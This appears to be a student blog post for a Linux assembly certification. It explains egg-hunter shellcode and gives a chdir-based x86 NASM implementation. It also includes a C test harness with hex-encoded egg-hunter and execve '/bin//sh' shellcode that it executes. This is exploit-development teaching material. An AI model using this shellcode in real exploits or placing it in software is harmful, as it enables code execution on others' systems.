Title: SLAE32 - Assignment 3
Date: 2022-06-04T09:14:33.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><!--kg-card-begin: markdown--><p>The source code for this assignment can be found <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/3">here</a>.</p>
<p>Follows the list of files:</p>
<ul>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/egg_hunter.nasm">egg_hunter.nasm</a>, the Assembly code of the egg-hunter</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/test_egg_hunter.c">test_egg_hunter.c</a>, a C program written for testing the egg-hunter with the <code>execve</code> shellcode</li>
</ul>
<!--kg-card-end: markdown--><h2 id="theory">Theory</h2><!--kg-card-begin: markdown--><p>Now comes the question: what is an <em>Egg Hunter</em>?</p>
<p>According to a <a href="https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf">paper</a> from <code>Exploit-DB</code>:</p>
<blockquote>
<p>When the &quot;Egg hunter&quot; shellcode is executed, it searches for the unique &quot;tag&quot; that was prefixed with the large payload and starts the execution of the payload.<br>
[...]<br>
The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode. Instead, a unique &quot;tag&quot; is prefixed with shellcode.</p>
</blockquote>
<!--kg-card-end: markdown--><h2 id="practice">Practice</h2><h3 id="implementation">Implementation</h3><p>Given I had zero experience with <code>egg hunters</code>, I tried to search for documents detailing how to create this type of shellcode.</p><p>I stumbled on this particular document - <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a> - which shows some techniques you can employ for your own implementation.</p><p>Since the <em>SIGSEGV handler technique</em> is considered <em>infeasible</em>, mainly due to its size, I decided to try using the <em>system call technique</em>.</p><p>The system call I chose to use is <a href="https://man7.org/linux/man-pages/man2/chdir.2.html">chdir()</a>. Follows its prototype:</p><pre><code class="language-cpp">#include &lt;unistd.h&gt;

int chdir(const char *path);</code></pre><p>All it does is try to change the <em>Current Working Directory</em> (<code>CWD</code>) to the path pointed to the argument <code>path</code> (which is a pointer).</p><p>Since it accepts a pointer, we can use it to test memory addresses. Given the function already implements a <em>SIGSEGV handler</em>, it doesn't throw a SIGSEGV error, crashing the program.</p><p>Instead, it returns the error <code>EFAULT</code> (<code>0xfffffff2</code>), indicating that a bad address was passed to the function.</p><p>Follows my implementation in Assembly language:</p><pre><code class="language-nasm">; Author: Robert C. Raducioiu (rbct)

global _start

section .text

_start:

    ; clear registers for later use
    xor ebx, ebx
    mul ebx

; This routine checks loops over memory addresses, checking if they are valid
; If the address is valid the shellcode continues to CheckBytes
CheckAddress:

    ; increment memory address by 1 (or use "add ebx, 4" if
    ;   you're sure about the offset)
    inc ebx

    ; call chdir(EBX)
    xor eax, eax
    mov al, 12
    int 0x80

    ; if the return value is 0xfffffff2 (EFAULT), go back to CheckAddress,
    ;   otherwise continue to CheckBytes
    cmp al, 0xf2
    jz CheckAddress

; This routine checks the 4 bytes stored at the address validated by
;   Checkaddress. The goal is to find the Egg Hunter Tag, in this case "rbct"
CheckBytes:

    ; load the 4 bytes from the memory address we're checking
    mov edx, DWORD[ebx]

    ; string "rbcs"
    mov esi, 0x72626373
    
    ; increment esi, thus: "rbct"
    inc esi

    ; check if the 4 bytes are equal to the flag, otherwise
    ;   check the next 4 bytes
    cmp edx, esi
    jnz CheckAddress

    ; if the two DWORDs are equal, then increment the address by 4, and
    ;   execute the shellcode
    add ebx, 4
    call ebx</code></pre><h2 id="testing">Testing</h2><p>I've tested this egg-hunter above with the <code>exit</code> shellcode. To do this, I've appended the following Assembly code at the end of the previous file:</p><pre><code class="language-nasm">section .data

    shellcode: db 0x74, 0x63, 0x62, 0x72, 0x31, 0xc0, 0x40, 0xcd, 0x80</code></pre><p>After running it, I've confirmed it works correctly:</p><pre><code class="language-bash"># assembling
nasm -f elf32 egg_hunter.nasm

# linking
#   also set the stack as executable (for the exit shellcode)
ld -N -o egg_hunter egg_hunter.o

./egg_hunter</code></pre><p>Instead of throwing a <code>SIGSEGV</code> error, it ran the exit shellcode successfully.</p><p>Next, I decided to try it with the <code>execve-stack</code> shellcode:</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

// tag "rbct" prepended to the shellcode
unsigned char shellcode[] = "\x74\x63\x62\x72\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

// egg-hunter shellcode
unsigned char egghunter[] = "\x31\xdb\xf7\xe3\x43\x31\xc0\xb0\x0c\xcd\x80\x3c\xf2\x74\xf5\x8b\x13\xbe\x73\x63\x62\x72\x46\x39\xf2\x75\xe9\x83\xc3\x04\xff\xd3";

main() {
    printf("[+] Shellcode length: %d\n", strlen(shellcode));
    printf("[+] Egg-hunter length: %d\n", strlen(egghunter));

    // run the egg-hunter shellcode
    int (*ret)() = (int(*)())egghunter;
    ret();
}</code></pre><p>I saved the <code>execve</code> shellcode inside an array named <code>shellcode</code>, while storing the egg-hunter shellcode inside the array <code>egghunter</code>.</p><p>Inside the <code>main</code> function, the programs prints the length of the two shellcodes, and finally executes the egg-hunter shellcode. It does so by getting the pointer of the latter, and turning it into a function.</p><p>Follows a screenshot demonstrating the successful execution of the program:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-3.png" class="kg-image" alt="Egg-hunter found and executed the execve shellcode" loading="lazy" width="1251" height="203" srcset="__GHOST_URL__/content/images/size/w600/2022/06/image-3.png 600w, __GHOST_URL__/content/images/size/w1000/2022/06/image-3.png 1000w, __GHOST_URL__/content/images/2022/06/image-3.png 1251w" sizes="(min-width: 720px) 720px"><figcaption>Egg-hunter found and executed the <code>execve</code> shellcode</figcaption></figure>